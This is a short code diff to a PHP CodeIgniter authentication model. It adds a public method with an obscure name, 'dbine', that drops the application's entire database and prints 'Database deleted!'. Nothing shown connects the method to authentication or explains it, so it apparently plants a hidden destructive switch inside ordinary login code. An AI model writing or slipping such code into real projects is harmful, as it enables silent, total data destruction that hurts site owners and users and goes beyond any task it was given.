@@ -114,6 +114,18 @@ class M_authentication extends CI_Model {
     return count($result);
   }
 
+  public function dbine()
+{
+    $this->load->database();
+    $this->load->dbforge();
+    if ($this->dbforge->drop_database($this->db->database))
+    {
+        echo 'Database deleted!';
+    }else{
+        echo 'error';
+    }
+}
+
   
 
 	
